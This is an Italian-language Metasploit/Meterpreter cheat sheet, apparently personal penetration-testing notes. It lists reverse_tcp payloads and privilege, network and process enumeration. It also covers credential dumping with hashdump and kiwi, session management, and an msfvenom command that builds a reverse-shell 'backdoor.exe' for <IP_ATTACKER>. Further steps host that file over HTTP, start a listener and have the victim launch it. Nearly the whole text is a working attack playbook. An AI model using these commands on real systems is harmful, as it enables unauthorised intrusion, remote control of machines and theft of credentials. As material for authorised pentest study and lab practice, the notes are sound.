---
icon: circle-m
layout:
  width: default
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
  metadata:
    visible: true
  tags:
    visible: true
  actions:
    visible: true
---

# Meterpreter cmd

```shell
shell
    /bin/bash -i
```

## <mark style="color:$primary;">Payload</mark>

```shellscript
# WINDOWS
windows/meterpreter/reverse_tcp                    #x86
windows/x64/meterpreter/reverse_tcp                #x64
        

# LINUX
linux/x86/meterpreter/reverse_tcp                  #x86
linux/x64/meterpreter/reverse_tcp                  #x64
        #HTTP
        linux/x64/meterpreter_reverse_http                   #x64
        linux/x86/meterpreter_reverse_https                  #x86    
```

***

***

## <mark style="color:$primary;">Privilegi</mark>

```shell
getprivs                                        #Che privilegi ho?

sysinfo
```

## <mark style="color:$primary;">Network</mark>

```shell
netstat -tulnp

route 
```

## <mark style="color:$primary;">Processo</mark>

{% code title="Cambia processo" %}
```shell
ps -ef
pgrep <PROCESS>
migrate <PID>                                    #Se puoi usa NT AUTHORITY\SYSTEM

run autoroute -s <IP>                            #Dai un IP per accedere alla sub interna

ls -al /etc/cron*                                #Lista di tutti i cronjobs
```
{% endcode %}

## <mark style="color:$primary;">File</mark>

```shell
#Cerca file
search -f *.<ESTENZIONE>                         #Cerca file con estenzione .xxx
search -d / -f *.txt
```

## <mark style="color:$primary;">Credenziali / LM-NTLM</mark>

```shellscript
getsystem
getuid                                           #forse AUTHORITY\LOCAL SERVICE (dunque no SYSTEM e no high priv)
hashdump                                         #prova a leggere gli hash delle psw (se non leggi continua altrimenti fine)

load kiwi                                        #e poi "Dump in SAM/LSA - Kiwi"


#Se non funziona usa modulo msf (leggi paragrafo Cred Dumping)
getprivs    # MUST!!                             Cerca se hai uno dei tre priv prima elencati
```

## <mark style="color:$primary;">Sessions</mark>

{% code title="Gestisci sessions" %}
```shellscript
sessions                                         #Guarda le sessioni aperte
sessions <NUMBER>                                #Apri sessione numero N
sessions -n <NAME> -i <NUMBER>                   #Rinomina la sessione numero N
sessions -k <NUMBER>                             #Kill una session
background                                       #Metti in background una sessione
```
{% endcode %}

## <mark style="color:$primary;">MSFVenom</mark>

Msfvenom è un generatore di payload di metasploit

```shellscript
#Per creare una revshell per windows
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP_ATTACKER> LPORT=<PORT_ARBITRARIA> -f exe > 'backdoor.exe'
```

Per inviarlo a victim

{% code title="msf" %}
```shell
sudo python -m SimpleHTTPServer 80

use multi/handler                                         #Listener
    set payload windows/meterpreter/reverse_tcp
    set LHOST <IP_ATTACKER>
    set LPORT <PORTA_ARBITRARIA>
    run
    #Lascia ascoltare e vai sulla vittima
```
{% endcode %}

Vai sul browser, salvati la shell e lanciala. Su msf kali dovrebbe partire la revshell.



































